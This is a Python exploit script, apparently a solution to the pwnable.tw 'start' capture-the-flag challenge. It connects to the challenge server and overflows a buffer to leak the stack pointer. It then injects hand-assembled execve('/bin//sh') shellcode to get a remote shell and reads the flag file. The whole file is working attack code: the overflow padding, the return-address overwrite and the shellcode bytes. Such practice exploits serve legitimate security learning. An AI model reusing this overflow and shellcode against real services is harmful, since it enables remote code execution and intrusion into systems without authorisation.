import socket
import binascii
import struct

def opcodify(hexstr):
    return struct.pack('<I', hexstr)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(('chall.pwnable.tw', 10000))
# sock.connect(('localhost', 5000))
print('{}'.format(sock.recv(4096)))

print('Fetching ESP')

buff = b'hack' * 5           # 20 chars
buff += opcodify(0x08048087)
print('Sending: {}'.format(buff))
sock.send(buff)

outp = sock.recv(4096)
esp, = struct.unpack('<I', outp[:4])
print('ESP: {}'.format(hex(esp)))

print('Launching shell')
buff = b'hack' * 5
buff += opcodify(esp+20)
buff += binascii.unhexlify('31C0')       # xor eax,eax
buff += binascii.unhexlify('50')         # push eax
buff += binascii.unhexlify('682F2F7368') # push dword 0x68732f2f
buff += binascii.unhexlify('682F62696E') # push dword 0x6e69622f
buff += binascii.unhexlify('89E3')       # mov ebx,esp
buff += binascii.unhexlify('50')         # push eax
buff += binascii.unhexlify('53')         # push ebx
buff += binascii.unhexlify('89E1')       # mov ecx,esp
buff += binascii.unhexlify('B00B')       # mov al,0xb
buff += binascii.unhexlify('31D2')       # xor edx,edx
buff += binascii.unhexlify('CD80')       # int 0x80

print('Sending: {}'.format(buff))
sock.send(buff)

print('Fetching CTF flag')

sock.send(b'cat /home/start/flag\n')
print(sock.recv(4096).decode())

sock.close()
